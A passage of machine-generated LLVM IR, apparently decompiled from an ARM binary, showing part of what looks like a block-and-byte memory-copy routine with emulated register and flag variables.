  store i32 %v1_13fb0, i32* %r2.global-to-local, align 4
  %v3_13fb0 = sub i32 27, %v0_13fa8
  %v4_13fb0 = and i32 %v3_13fb0, %v1_13fa8
  %v5_13fb0 = icmp slt i32 %v4_13fb0, 0
  store i1 %v5_13fb0, i1* %cpsr_v.global-to-local, align 1
  %v6_13fb0 = icmp slt i32 %v1_13fb0, 0
  store i1 %v6_13fb0, i1* %cpsr_n.global-to-local, align 1
  %v7_13fb0 = icmp eq i32 %v1_13fa8, 20
  store i1 %v7_13fb0, i1* %cpsr_z.global-to-local, align 1
  %v2_13fb4 = xor i1 %v6_13fb0, %v5_13fb0
  br i1 %v2_13fb4, label %dec_label_pc_13fe8, label %dec_label_pc_13fb8

dec_label_pc_13fb8:                               ; preds = %dec_label_pc_13fb0
  %v0_13fb8 = load i32, i32* @r4, align 4
  store i32 %v0_13fb8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fbc:                               ; preds = %dec_label_pc_13fbc.dec_label_pc_13fbc_crit_edge, %dec_label_pc_13fb8
  %v0_13fc0 = phi i32 [ %v12_13fc8, %dec_label_pc_13fbc.dec_label_pc_13fbc_crit_edge ], [ %v0_13fc093, %dec_label_pc_13fb8 ]
  %v0_13fbc = phi i32 [ %v0_13fbc.pre, %dec_label_pc_13fbc.dec_label_pc_13fbc_crit_edge ], [ %v0_13fbc92, %dec_label_pc_13fb8 ]
  %v1_13fbc = inttoptr i32 %v0_13fbc to i32*
  %v2_13fbc = load i32, i32* %v1_13fbc, align 4
  %v3_13fbc = add i32 %v0_13fbc, 4
  %v4_13fbc = inttoptr i32 %v3_13fbc to i32*
  %v5_13fbc = load i32, i32* %v4_13fbc, align 4
  store i32 %v5_13fbc, i32* %r4.global-to-local, align 4
  %v6_13fbc = add i32 %v0_13fbc, 8
  %v7_13fbc = inttoptr i32 %v6_13fbc to i32*
  %v8_13fbc = load i32, i32* %v7_13fbc, align 4
  store i32 %v8_13fbc, i32* %ip.global-to-local, align 4
  %v9_13fbc = add i32 %v0_13fbc, 12
  %v10_13fbc = inttoptr i32 %v9_13fbc to i32*
  %v11_13fbc = load i32, i32* %v10_13fbc, align 4
  store i32 %v11_13fbc, i32* %lr.global-to-local, align 4
  %v12_13fbc = add i32 %v0_13fbc, 16
  store i32 %v12_13fbc, i32* %r1.global-to-local, align 4
  %v1_13fc0 = inttoptr i32 %v0_13fc0 to i32*
  store i32 %v2_13fbc, i32* %v1_13fc0, align 4
  %v3_13fc0 = add i32 %v0_13fc0, 4
  %v4_13fc0 = inttoptr i32 %v3_13fc0 to i32*
  %v5_13fc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13fc0, i32* %v4_13fc0, align 4
  %v6_13fc0 = add i32 %v0_13fc0, 8
  %v7_13fc0 = inttoptr i32 %v6_13fc0 to i32*
  %v8_13fc0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_13fc0, i32* %v7_13fc0, align 4
  %v9_13fc0 = add i32 %v0_13fc0, 12
  %v10_13fc0 = inttoptr i32 %v9_13fc0 to i32*
  %v11_13fc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13fc0, i32* %v10_13fc0, align 4
  %v12_13fc0 = add i32 %v0_13fc0, 16
  store i32 %v12_13fc0, i32* %r0.global-to-local, align 4
  %v0_13fc4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13fc4 = inttoptr i32 %v0_13fc4 to i32*
  %v2_13fc4 = load i32, i32* %v1_13fc4, align 4
  store i32 %v2_13fc4, i32* @r3, align 4
  %v3_13fc4 = add i32 %v0_13fc4, 4
  %v4_13fc4 = inttoptr i32 %v3_13fc4 to i32*
  %v5_13fc4 = load i32, i32* %v4_13fc4, align 4
  store i32 %v5_13fc4, i32* %r4.global-to-local, align 4
  %v6_13fc4 = add i32 %v0_13fc4, 8
  %v7_13fc4 = inttoptr i32 %v6_13fc4 to i32*
  %v8_13fc4 = load i32, i32* %v7_13fc4, align 4
  store i32 %v8_13fc4, i32* @ip, align 4
  %v9_13fc4 = add i32 %v0_13fc4, 12
  %v10_13fc4 = inttoptr i32 %v9_13fc4 to i32*
  %v11_13fc4 = load i32, i32* %v10_13fc4, align 4
  store i32 %v11_13fc4, i32* %lr.global-to-local, align 4
  %v12_13fc4 = add i32 %v0_13fc4, 16
  store i32 %v12_13fc4, i32* %r1.global-to-local, align 4
  %v1_13fc8 = inttoptr i32 %v12_13fc0 to i32*
  store i32 %v2_13fc4, i32* %v1_13fc8, align 4
  %v3_13fc8 = add i32 %v0_13fc0, 20
  %v4_13fc8 = inttoptr i32 %v3_13fc8 to i32*
  %v5_13fc8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13fc8, i32* %v4_13fc8, align 4
  %v6_13fc8 = add i32 %v0_13fc0, 24
  %v7_13fc8 = inttoptr i32 %v6_13fc8 to i32*
  %v8_13fc8 = load i32, i32* @ip, align 4
  store i32 %v8_13fc8, i32* %v7_13fc8, align 4
  %v9_13fc8 = add i32 %v0_13fc0, 28
  %v10_13fc8 = inttoptr i32 %v9_13fc8 to i32*
  %v11_13fc8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13fc8, i32* %v10_13fc8, align 4
  %v12_13fc8 = add i32 %v0_13fc0, 32
  store i32 %v12_13fc8, i32* %r0.global-to-local, align 4
  %v0_13fcc = load i32, i32* %r2.global-to-local, align 4
  %v1_13fcc = add i32 %v0_13fcc, -32
  store i32 %v1_13fcc, i32* %r2.global-to-local, align 4
  %v3_13fcc = sub i32 31, %v0_13fcc
  %v4_13fcc = and i32 %v3_13fcc, %v0_13fcc
  %v5_13fcc = icmp slt i32 %v4_13fcc, 0
  %v6_13fcc = icmp slt i32 %v1_13fcc, 0
  %v2_13fd0 = xor i1 %v6_13fcc, %v5_13fcc
  br i1 %v2_13fd0, label %dec_label_pc_13fd4, label %dec_label_pc_13fbc.dec_label_pc_13fbc_crit_edge

dec_label_pc_13fbc.dec_label_pc_13fbc_crit_edge:  ; preds = %dec_label_pc_13fbc
  %v0_13fbc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13fbc

dec_label_pc_13fd4:                               ; preds = %dec_label_pc_13fbc
  %v1_13fd4 = add i32 %v0_13fcc, -16
  %v3_13fd4 = add i32 %v0_13fcc, 2147483616
  %v4_13fd4 = and i32 %v1_13fd4, %v3_13fd4
  %v5_13fd4 = icmp slt i32 %v4_13fd4, 0
  store i1 %v5_13fd4, i1* %cpsr_v.global-to-local, align 1
  %v6_13fd4 = icmp slt i32 %v1_13fd4, 0
  store i1 %v6_13fd4, i1* %cpsr_n.global-to-local, align 1
  %v7_13fd4 = icmp eq i32 %v1_13fd4, 0
  store i1 %v7_13fd4, i1* %cpsr_z.global-to-local, align 1
  %v2_13fd8 = xor i1 %v6_13fd4, %v5_13fd4
  br i1 %v2_13fd8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_13fd4
  %v3_13fd8 = load i32, i32* %r1.global-to-local, align 4
  %v4_13fd8 = inttoptr i32 %v3_13fd8 to i32*
  %v5_13fd8 = load i32, i32* %v4_13fd8, align 4
  store i32 %v5_13fd8, i32* @r3, align 4
  %v6_13fd8 = add i32 %v3_13fd8, 4
  %v7_13fd8 = inttoptr i32 %v6_13fd8 to i32*
  %v8_13fd8 = load i32, i32* %v7_13fd8, align 4
  store i32 %v8_13fd8, i32* %r4.global-to-local, align 4
  %v9_13fd8 = add i32 %v3_13fd8, 8
  %v10_13fd8 = inttoptr i32 %v9_13fd8 to i32*
  %v11_13fd8 = load i32, i32* %v10_13fd8, align 4
  store i32 %v11_13fd8, i32* @ip, align 4
  %v12_13fd8 = add i32 %v3_13fd8, 12
  %v13_13fd8 = inttoptr i32 %v12_13fd8 to i32*
  %v14_13fd8 = load i32, i32* %v13_13fd8, align 4
  store i32 %v14_13fd8, i32* %lr.global-to-local, align 4
  %v15_13fd8 = add i32 %v3_13fd8, 16
  store i32 %v15_13fd8, i32* %r1.global-to-local, align 4
  %v4_13fdc = inttoptr i32 %v12_13fc8 to i32*
  store i32 %v5_13fd8, i32* %v4_13fdc, align 4
  %v6_13fdc = add i32 %v0_13fc0, 36
  %v7_13fdc = inttoptr i32 %v6_13fdc to i32*
  %v8_13fdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_13fdc, i32* %v7_13fdc, align 4
  %v9_13fdc = add i32 %v0_13fc0, 40
  %v10_13fdc = inttoptr i32 %v9_13fdc to i32*
  %v11_13fdc = load i32, i32* @ip, align 4
  store i32 %v11_13fdc, i32* %v10_13fdc, align 4
  %v12_13fdc = add i32 %v0_13fc0, 44
  %v13_13fdc = inttoptr i32 %v12_13fdc to i32*
  %v14_13fdc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_13fdc, i32* %v13_13fdc, align 4
  %v15_13fdc = add i32 %v0_13fc0, 48
  store i32 %v15_13fdc, i32* %r0.global-to-local, align 4
  %v3_13fe0 = load i32, i32* %r2.global-to-local, align 4
  %v4_13fe0 = add i32 %v3_13fe0, -16
  store i32 %v4_13fe0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_13fd4, %bb136
  %v3_13ff0101110 = phi i32 [ %v15_13fdc, %bb136 ], [ %v12_13fc8, %dec_label_pc_13fd4 ]
  %v0_13fe8.pre = phi i32 [ %v4_13fe0, %bb136 ], [ %v1_13fcc, %dec_label_pc_13fd4 ]
  %v2_13fe4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13fe4, i32* @r4, align 4
  br label %dec_label_pc_13fe8

dec_label_pc_13fe8:                               ; preds = %dec_label_pc_13fb0, %bb137
  %v3_13ff0100 = phi i32 [ %v0_13fc093, %dec_label_pc_13fb0 ], [ %v3_13ff0101110, %bb137 ]
  %v0_13fe8 = phi i32 [ %v1_13fb0, %dec_label_pc_13fb0 ], [ %v0_13fe8.pre, %bb137 ]
  %v1_13fe8 = add i32 %v0_13fe8, 20
  store i32 %v1_13fe8, i32* %r2.global-to-local, align 4
  %v3_13fe8 = sub i32 0, %v0_13fe8
  %v4_13fe8 = and i32 %v1_13fe8, %v3_13fe8
  %v5_13fe8 = icmp slt i32 %v4_13fe8, 0
  store i1 %v5_13fe8, i1* %cpsr_v.global-to-local, align 1
  %v6_13fe8 = icmp slt i32 %v1_13fe8, 0
  store i1 %v6_13fe8, i1* %cpsr_n.global-to-local, align 1
  %v7_13fe8 = icmp eq i32 %v1_13fe8, 0
  store i1 %v7_13fe8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %.thread114, %dec_label_pc_13fe8
  %v0_13ffc.pre157 = phi i32 [ %v0_13ffc.pre, %.thread114 ], [ %v1_13fe8, %dec_label_pc_13fe8 ]
  %v3_13ff0 = phi i32 [ %v3_13ff098115, %.thread114 ], [ %v3_13ff0100, %dec_label_pc_13fe8 ]
  %v1_13ff4 = phi i1 [ %v1_13ff8, %.thread114 ], [ %v5_13fe8, %dec_label_pc_13fe8 ]
  %v0_13ff4 = phi i1 [ %v0_13ff8, %.thread114 ], [ %v6_13fe8, %dec_label_pc_13fe8 ]
  %v2_13fec = xor i1 %v1_13ff4, %v0_13ff4
  br i1 %v2_13fec, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_13fec
  %v3_13fec = load i32, i32* %r1.global-to-local, align 4
  %v4_13fec = inttoptr i32 %v3_13fec to i32*
  %v5_13fec = load i32, i32* %v4_13fec, align 4
  store i32 %v5_13fec, i32* @r3, align 4
  %v6_13fec = add i32 %v3_13fec, 4
  %v7_13fec = inttoptr i32 %v6_13fec to i32*
  %v8_13fec = load i32, i32* %v7_13fec, align 4
  store i32 %v8_13fec, i32* @ip, align 4
  %v9_13fec = add i32 %v3_13fec, 8
  %v10_13fec = inttoptr i32 %v9_13fec to i32*
  %v11_13fec = load i32, i32* %v10_13fec, align 4
  store i32 %v11_13fec, i32* %lr.global-to-local, align 4
  %v12_13fec = add i32 %v3_13fec, 12
  store i32 %v12_13fec, i32* %r1.global-to-local, align 4
  %v4_13ff0 = inttoptr i32 %v3_13ff0 to i32*
  store i32 %v5_13fec, i32* %v4_13ff0, align 4
  %v6_13ff0 = add i32 %v3_13ff0, 4
  %v7_13ff0 = inttoptr i32 %v6_13ff0 to i32*
  %v8_13ff0 = load i32, i32* @ip, align 4
  store i32 %v8_13ff0, i32* %v7_13ff0, align 4
  %v9_13ff0 = add i32 %v3_13ff0, 8
  %v10_13ff0 = inttoptr i32 %v9_13ff0 to i32*
  %v11_13ff0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13ff0, i32* %v10_13ff0, align 4
  %v12_13ff0 = add i32 %v3_13ff0, 12
  store i32 %v12_13ff0, i32* %r0.global-to-local, align 4
  %v3_13ff4 = load i32, i32* %r2.global-to-local, align 4
  %v4_13ff4 = add i32 %v3_13ff4, -12
  store i32 %v4_13ff4, i32* %r2.global-to-local, align 4
  %v6_13ff4 = sub i32 11, %v3_13ff4
  %v7_13ff4 = and i32 %v6_13ff4, %v3_13ff4
  %v8_13ff4 = icmp slt i32 %v7_13ff4, 0
  store i1 %v8_13ff4, i1* %cpsr_v.global-to-local, align 1
  %v9_13ff4 = icmp slt i32 %v4_13ff4, 0
  store i1 %v9_13ff4, i1* %cpsr_n.global-to-local, align 1
  %v10_13ff4 = icmp eq i32 %v3_13ff4, 12
  store i1 %v10_13ff4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_13fec, %bb138
  %v0_13ffc.pre = phi i32 [ %v4_13ff4, %bb138 ], [ %v0_13ffc.pre157, %dec_label_pc_13fec ]
  %v3_13ff098115 = phi i32 [ %v12_13ff0, %bb138 ], [ %v3_13ff0, %dec_label_pc_13fec ]
  %v1_13ff8 = phi i1 [ %v8_13ff4, %bb138 ], [ %v1_13ff4, %dec_label_pc_13fec ]
  %v0_13ff8 = phi i1 [ %v9_13ff4, %bb138 ], [ %v0_13ff4, %dec_label_pc_13fec ]
  %v2_13ff8 = xor i1 %v1_13ff8, %v0_13ff8
  br i1 %v2_13ff8, label %dec_label_pc_13ffc, label %dec_label_pc_13fec

dec_label_pc_13ffc:                               ; preds = %.thread114, %dec_label_pc_13fa8
  %v4_1400c = phi i32 [ %v0_13fc093, %dec_label_pc_13fa8 ], [ %v3_13ff098115, %.thread114 ]
  %v0_13ffc = phi i32 [ %v1_13fa8, %dec_label_pc_13fa8 ], [ %v0_13ffc.pre, %.thread114 ]
  %v1_13ffc = add i32 %v0_13ffc, 8
  store i32 %v1_13ffc, i32* %r2.global-to-local, align 4
  %v3_13ffc = sub i32 0, %v0_13ffc
  %v4_13ffc = and i32 %v1_13ffc, %v3_13ffc
  %v5_13ffc = icmp slt i32 %v4_13ffc, 0
  store i1 %v5_13ffc, i1* %cpsr_v.global-to-local, align 1
  %v6_13ffc = icmp slt i32 %v1_13ffc, 0
  store i1 %v6_13ffc, i1* %cpsr_n.global-to-local, align 1
  %v7_13ffc = icmp eq i32 %v1_13ffc, 0
  store i1 %v7_13ffc, i1* %cpsr_z.global-to-local, align 1
  %v2_14000 = xor i1 %v6_13ffc, %v5_13ffc
  br i1 %v2_14000, label %bb140, label %dec_label_pc_14004

dec_label_pc_14004:                               ; preds = %dec_label_pc_13ffc
  %v1_14004 = add i32 %v0_13ffc, 4
  store i32 %v1_14004, i32* %r2.global-to-local, align 4
  %v3_14004 = sub i32 -5, %v0_13ffc
  %v4_14004 = and i32 %v3_14004, %v1_13ffc
  %v5_14004 = icmp slt i32 %v4_14004, 0
  store i1 %v5_14004, i1* %cpsr_v.global-to-local, align 1
  %v6_14004 = icmp slt i32 %v1_14004, 0
  store i1 %v6_14004, i1* %cpsr_n.global-to-local, align 1
  %v7_14004 = icmp eq i32 %v1_13ffc, 4
  store i1 %v7_14004, i1* %cpsr_z.global-to-local, align 1
  %v2_14008 = xor i1 %v6_14004, %v5_14004
  %v3_14008 = load i32, i32* %r1.global-to-local, align 4
  %v4_14008 = inttoptr i32 %v3_14008 to i32*
  %v5_14008 = load i32, i32* %v4_14008, align 4
  store i32 %v5_14008, i32* @r3, align 4
  %v7_14008 = add i32 %v3_14008, 4
  br i1 %v2_14008, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_14004
  store i32 %v7_14008, i32* %r1.global-to-local, align 4
  %v5_1400c = inttoptr i32 %v4_1400c to i32*
  store i32 %v5_14008, i32* %v5_1400c, align 4
  %v6_1400c = load i32, i32* %r0.global-to-local, align 4
  %v7_1400c = add i32 %v6_1400c, 4
  store i32 %v7_1400c, i32* %r0.global-to-local, align 4
  %v0_1401c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_14004
  %v7_14010 = inttoptr i32 %v7_14008 to i32*
  %v8_14010 = load i32, i32* %v7_14010, align 4
  store i32 %v8_14010, i32* @ip, align 4
  %v9_14010 = add i32 %v3_14008, 8
  store i32 %v9_14010, i32* %r1.global-to-local, align 4
  %v4_14014 = inttoptr i32 %v4_1400c to i32*
  store i32 %v5_14008, i32* %v4_14014, align 4
  %v6_14014 = add i32 %v4_1400c, 4
  %v7_14014 = inttoptr i32 %v6_14014 to i32*
  %v8_14014 = load i32, i32* @ip, align 4
  store i32 %v8_14014, i32* %v7_14014, align 4
  %v9_14014 = add i32 %v4_1400c, 8
  store i32 %v9_14014, i32* %r0.global-to-local, align 4
  %v3_14018 = load i32, i32* %r2.global-to-local, align 4
  %v4_14018 = add i32 %v3_14018, -4
  store i32 %v4_14018, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_13ffc, %bb, %dec_label_pc_141cc, %dec_label_pc_14160, %dec_label_pc_140f4, %bb139
  %v0_1401c = phi i32 [ %v0_1401c.pre, %.thread121 ], [ %v2_1406c, %.thread127 ], [ %v1_13ffc, %dec_label_pc_13ffc ], [ %v2_13f90, %bb ], [ %v0_1401c60, %dec_label_pc_141cc ], [ %v0_1401c59, %dec_label_pc_14160 ], [ %v0_1401c58, %dec_label_pc_140f4 ], [ %v4_14018, %bb139 ]
  %v1_1401c = add i32 %v0_1401c, 4
  store i32 %v1_1401c, i32* %r2.global-to-local, align 4
  %v3_1401c = sub i32 0, %v0_1401c
  %v4_1401c = and i32 %v1_1401c, %v3_1401c
  %v5_1401c = icmp slt i32 %v4_1401c, 0
  store i1 %v5_1401c, i1* %cpsr_v.global-to-local, align 1
  %v6_1401c = icmp slt i32 %v1_1401c, 0
  store i1 %v6_1401c, i1* %cpsr_n.global-to-local, align 1
  %v7_1401c = icmp eq i32 %v1_1401c, 0
  store i1 %v7_1401c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1401c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_14024.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_14020 = load i8*, i8** %stack_var_-8, align 4
  %v4_14020 = ptrtoint i8* %v3_14020 to i32
  store i32 %v4_14020, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_14024 = phi i32 [ %v0_14024.pre, %bb140.bb142_crit_edge ], [ %v8_13f8c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1401c, i32 %v0_14024)
  %v0_14028 = load i32, i32* %r2.global-to-local, align 4
  %v1_14028 = add i32 %v0_14028, -2
  %v3_14028 = sub i32 1, %v0_14028
  %v4_14028 = and i32 %v3_14028, %v0_14028
  %v5_14028 = icmp slt i32 %v4_14028, 0
  store i1 %v5_14028, i1* %cpsr_v.global-to-local, align 1
  %v6_14028 = icmp slt i32 %v1_14028, 0
  store i1 %v6_14028, i1* %cpsr_n.global-to-local, align 1
  %v7_14028 = icmp eq i32 %v0_14028, 2
  store i1 %v7_14028, i1* %cpsr_z.global-to-local, align 1
  %v0_1402c = load i32, i32* %r1.global-to-local, align 4
  %v1_1402c = inttoptr i32 %v0_1402c to i8*
  %v2_1402c = load i8, i8* %v1_1402c, align 1
  %v5_1402c = add i32 %v0_1402c, 1
  store i32 %v5_1402c, i32* %r1.global-to-local, align 4
  %v2_14030 = load i32, i32* %r0.global-to-local, align 4
  %v3_14030 = inttoptr i32 %v2_14030 to i8*
  store i8 %v2_1402c, i8* %v3_14030, align 1
  %v4_14030 = load i32, i32* %r0.global-to-local, align 4
  %v5_14030 = add i32 %v4_14030, 1
  store i32 %v5_14030, i32* %r0.global-to-local, align 4
  %v0_14034 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14034 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14034 = xor i1 %v0_14034, %v1_14034
  br i1 %v2_14034, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_14034 = load i32, i32* %r1.global-to-local, align 4
  %v4_14034 = inttoptr i32 %v3_14034 to i8*
  %v5_14034 = load i8, i8* %v4_14034, align 1
  %v8_14034 = add i32 %v3_14034, 1
  store i32 %v8_14034, i32* %r1.global-to-local, align 4
  %v6_14038 = inttoptr i32 %v5_14030 to i8*
  store i8 %v5_14034, i8* %v6_14038, align 1
  %v7_14038 = load i32, i32* %r0.global-to-local, align 4
  %v8_14038 = add i32 %v7_14038, 1
  store i32 %v8_14038, i32* %r0.global-to-local, align 4
  %v1_1403c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1403c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_14040 = phi i32 [ %v8_14038, %bb143 ], [ %v5_14030, %bb142 ]
  %v2_14040 = phi i1 [ %v2_1403c.pre, %bb143 ], [ %v1_14034, %bb142 ]
  %v1_14040 = phi i1 [ %v1_1403c.pre, %bb143 ], [ %v0_14034, %bb142 ]
  %v0_1403c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1403c = xor i1 %v2_14040, %v1_14040
  %v4_1403c = or i1 %v0_1403c, %v3_1403c
  br i1 %v4_1403c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1403c = load i32, i32* %r1.global-to-local, align 4
  %v6_1403c = inttoptr i32 %v5_1403c to i8*
  %v7_1403c = load i8, i8* %v6_1403c, align 1
  %v10_1403c = add i32 %v5_1403c, 1
  store i32 %v10_1403c, i32* %r1.global-to-local, align 4
  %v8_14040 = inttoptr i32 %v7_14040 to i8*
  store i8 %v7_1403c, i8* %v8_14040, align 1
  %v9_14040 = load i32, i32* %r0.global-to-local, align 4
  %v10_14040 = add i32 %v9_14040, 1
  store i32 %v10_14040, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_14044 = load i8*, i8** %stack_var_-8, align 4
  %v3_14044 = ptrtoint i8* %v2_14044 to i32
  store i32 %v3_14044, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_13f8c)
  %v0_1404c.pre = load i32, i32* @ip, align 4
  %v0_14054.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_14058.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %dec_label_pc_13f98, %.thread125
  %v2_14058 = phi i32 [ %v1_13f80, %dec_label_pc_13f98 ], [ %v2_14058.pre, %.thread125 ]
  %v0_14054 = phi i32 [ %v0_13f80, %dec_label_pc_13f98 ], [ %v0_14054.pre, %.thread125 ]
  %v0_1404c = phi i32 [ %v1_13f98, %dec_label_pc_13f98 ], [ %v0_1404c.pre, %.thread125 ]
  %v1_1404c = sub i32 4, %v0_1404c
  store i32 %v1_1404c, i32* @ip, align 4
  %v1_14050 = add i32 %v1_1404c, -2
  %v3_14050 = sub i32 1, %v1_1404c
  %v4_14050 = and i32 %v3_14050, %v1_1404c
  %v5_14050 = icmp slt i32 %v4_14050, 0
  store i1 %v5_14050, i1* %cpsr_v.global-to-local, align 1
  %v6_14050 = icmp slt i32 %v1_14050, 0
  store i1 %v6_14050, i1* %cpsr_n.global-to-local, align 1
  %v7_14050 = icmp eq i32 %v1_1404c, 2
  store i1 %v7_14050, i1* %cpsr_z.global-to-local, align 1
  %v1_14054 = inttoptr i32 %v0_14054 to i8*
  %v2_14054 = load i8, i8* %v1_14054, align 1
  %v3_14054 = zext i8 %v2_14054 to i32
  store i32 %v3_14054, i32* @r3, align 4
  %v5_14054 = add i32 %v0_14054, 1
  store i32 %v5_14054, i32* %r1.global-to-local, align 4
  %v3_14058 = inttoptr i32 %v2_14058 to i8*
  store i8 %v2_14054, i8* %v3_14058, align 1
  %v4_14058 = load i32, i32* %r0.global-to-local, align 4
  %v5_14058 = add i32 %v4_14058, 1
  store i32 %v5_14058, i32* %r0.global-to-local, align 4
  %v0_1405c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1405c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1405c = xor i1 %v0_1405c, %v1_1405c
  br i1 %v2_1405c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1404c
  %v3_1405c = load i32, i32* %r1.global-to-local, align 4
  %v4_1405c = inttoptr i32 %v3_1405c to i8*
  %v5_1405c = load i8, i8* %v4_1405c, align 1
  %v6_1405c = zext i8 %v5_1405c to i32
  store i32 %v6_1405c, i32* @r3, align 4
  %v8_1405c = add i32 %v3_1405c, 1
  store i32 %v8_1405c, i32* %r1.global-to-local, align 4
  %v6_14060 = inttoptr i32 %v5_14058 to i8*
  store i8 %v5_1405c, i8* %v6_14060, align 1
  %v7_14060 = load i32, i32* %r0.global-to-local, align 4
  %v8_14060 = add i32 %v7_14060, 1
  store i32 %v8_14060, i32* %r0.global-to-local, align 4
  %v1_14064.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14064.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_1404c, %bb145
  %v7_14068 = phi i32 [ %v8_14060, %bb145 ], [ %v5_14058, %dec_label_pc_1404c ]
  %v2_14068 = phi i1 [ %v2_14064.pre, %bb145 ], [ %v1_1405c, %dec_label_pc_1404c ]
  %v1_14068 = phi i1 [ %v1_14064.pre, %bb145 ], [ %v0_1405c, %dec_label_pc_1404c ]
  %v0_14064 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_14064 = xor i1 %v2_14068, %v1_14068
  %v4_14064 = or i1 %v0_14064, %v3_14064
  br i1 %v4_14064, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_14064 = load i32, i32* %r1.global-to-local, align 4
  %v6_14064 = inttoptr i32 %v5_14064 to i8*
  %v7_14064 = load i8, i8* %v6_14064, align 1
  %v8_14064 = zext i8 %v7_14064 to i32
  store i32 %v8_14064, i32* @r3, align 4
  %v10_14064 = add i32 %v5_14064, 1
  store i32 %v10_14064, i32* %r1.global-to-local, align 4
  %v8_14068 = inttoptr i32 %v7_14068 to i8*
  store i8 %v7_14064, i8* %v8_14068, align 1
  %v9_14068 = load i32, i32* %r0.global-to-local, align 4
  %v10_14068 = add i32 %v9_14068, 1
  store i32 %v10_14068, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_1419c76 = phi i32 [ %v10_14068, %bb146 ], [ %v7_14068, %.thread126 ]
  %v0_1406c = load i32, i32* %r2.global-to-local, align 4
  %v1_1406c = load i32, i32* @ip, align 4
  %v2_1406c = sub i32 %v0_1406c, %v1_1406c
  store i32 %v2_1406c, i32* %r2.global-to-local, align 4
  %v4_1406c = xor i32 %v1_1406c, %v0_1406c
  %v5_1406c = xor i32 %v2_1406c, %v0_1406c
  %v6_1406c = and i32 %v5_1406c, %v4_1406c
  %v7_1406c = icmp slt i32 %v6_1406c, 0
  store i1 %v7_1406c, i1* %cpsr_v.global-to-local, align 1
  %v8_1406c = icmp slt i32 %v2_1406c, 0
  store i1 %v8_1406c, i1* %cpsr_n.global-to-local, align 1
  %v9_1406c = icmp eq i32 %v0_1406c, %v1_1406c
  store i1 %v9_1406c, i1* %cpsr_z.global-to-local, align 1
  %v2_14070 = xor i1 %v8_1406c, %v7_1406c
  br i1 %v2_14070, label %bb140, label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %.thread127
  %v0_14074 = load i32, i32* %r1.global-to-local, align 4
  %v1_14074 = urem i32 %v0_14074, 4
  store i32 %v1_14074, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14074 = icmp eq i32 %v1_14074, 0
  store i1 %v2_14074, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_14074 to i2
  br i1 %v2_14074, label %dec_label_pc_13fa8, label %dec_label_pc_1407c

dec_label_pc_1407c:                               ; preds = %dec_label_pc_13fa0, %dec_label_pc_14074
  %v0_1419c75 = phi i32 [ %v1_13f80, %dec_label_pc_13fa0 ], [ %v0_1419c76, %dec_label_pc_14074 ]
  %v0_14104 = phi i32 [ %v2_13f90, %dec_label_pc_13fa0 ], [ %v2_1406c, %dec_label_pc_14074 ]
  %v0_14084.off0 = phi i2 [ %extract.t, %dec_label_pc_13fa0 ], [ %extract.t130, %dec_label_pc_14074 ]
  %v0_1407c = phi i32 [ %v0_13f80, %dec_label_pc_13fa0 ], [ %v0_14074, %dec_label_pc_14074 ]
  %v1_1407c = and i32 %v0_1407c, -4
  store i32 %v1_1407c, i32* %r1.global-to-local, align 4
  %v1_14080 = inttoptr i32 %v1_1407c to i32*
  %v2_14080 = load i32, i32* %v1_14080, align 4
